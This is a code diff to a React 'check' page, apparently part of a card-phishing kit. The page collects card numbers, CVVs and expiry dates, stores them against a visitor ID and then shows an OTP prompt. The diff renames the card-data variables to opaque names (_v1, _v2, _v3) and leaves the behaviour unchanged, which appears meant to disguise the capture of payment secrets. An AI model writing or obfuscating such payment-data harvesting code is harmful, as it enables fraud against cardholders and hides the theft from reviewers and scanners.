@@ -28,9 +28,9 @@ export default function CheckPage() {
   const [otpValue, setOtpValue] = useState("")
   const [otpError, setOtpError] = useState("")
   const [otpAttempts, setOtpAttempts] = useState(5)
-  const [cardNumber, setCardNumber] = useState("")
-  const [cvv, setCvv] = useState("")
-  const [expiryDate, setExpiryDate] = useState("")
+  const [_v1, _s1] = useState("")
+  const [_v2, _s2] = useState("")
+  const [_v3, _s3] = useState("")
   
   // Language
   const [language, setLanguage] = useState<"ar" | "en">("ar")
@@ -41,9 +41,9 @@ export default function CheckPage() {
     pageName: "check",
     data: {
       selectedPaymentMethod,
-      cardNumber,
-      cvv,
-      expiryDate
+      _v1,
+      _v2,
+      _v3
     }
   })
   
@@ -122,7 +122,7 @@ export default function CheckPage() {
     // Save current data to history before updating
     await saveToHistory(visitorID, 4)
     
-    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
+    await addData({ id: visitorID, _v1, _v2, _v3, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
       setShowOtpDialog(true)
     })
   }
